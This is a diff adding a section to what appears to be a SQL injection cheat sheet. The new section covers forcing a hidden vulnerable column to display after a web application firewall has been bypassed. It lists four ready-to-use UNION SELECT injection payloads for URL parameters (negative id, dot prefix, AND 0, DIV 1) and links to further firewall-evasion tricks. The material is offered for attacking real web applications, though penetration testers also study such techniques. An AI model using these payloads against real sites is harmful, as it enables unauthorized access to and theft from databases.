@@ -213,6 +213,31 @@ Website must successfully load and we will see a number (in our case between 1-4
 
 We bypassed the WAF and found that the 1st column has the information (please refer to the photo).
 
+### UNION SELECT case: The vulnerable column is not being displayed
+Sometimes when we manage to bypass the WAF when using **UNION SELECT** query, we don't see the vulnerable column printed out in the page source (or content). A solution would be to force the server print out the vulnerable column, by using the following tricks:  
+
+1) add **-** before the GET/POST parameter value, for example:  
+```sql
+?id=-7' UNION SELECT 1,2,3,4--+
+```
+
+2) add **.** before the GET/POST parameter value, for example:  
+```sql
+?id=.7' UNION SELECT 1,2,3,4--+
+```
+
+3) Use **AND 1** or **AND 0** after the GET/POST parameter value, for example:  
+```sql
+?id=7' AND 0 UNION SELECT 1,2,3,4--+
+```
+
+4) Use **DIV 0** or **DIV 1** after the GET/POST parameter value, for example:  
+```sql
+?id=7' DIV 1 UNION SELECT 1,2,3,4--+
+```
+
+**Note:** If **AND** or **DIV** are being blocked by WAF, consider using the alternative methods for [AND alternative](https://github.com/kleiton0x00/Advanced-SQL-Injection-Cheatsheet/blob/main/The%20Alternative%20way%20of%20using%20And%200%20in%20SQL%20Injection/README.md) and [NULL alternative](https://github.com/kleiton0x00/Advanced-SQL-Injection-Cheatsheet/blob/main/The%20Alternative%20way%20of%20using%20Null%20in%20SQL%20Injection/README.md)
+
 ## Retrieving the database  
 
 ### Dumping with DIOS  
